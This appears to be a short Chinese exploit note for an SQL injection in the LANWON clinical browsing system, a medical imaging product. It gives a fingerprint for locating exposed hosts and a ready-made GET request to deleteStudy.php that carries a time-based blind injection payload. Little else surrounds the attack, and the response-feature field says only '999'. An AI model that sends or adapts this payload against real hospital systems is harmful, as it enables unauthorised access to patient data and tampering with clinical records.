# 蓝网科技临床浏览系统SQL注入漏洞

蓝网科技临床浏览系统 ｜ SQL注入 ｜ —
- **指纹**：`app="LANWON-临床浏览系统"`
- **请求**：`GET /xds/deleteStudy.php?documentUniqueId=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1`
- **响应特征**：999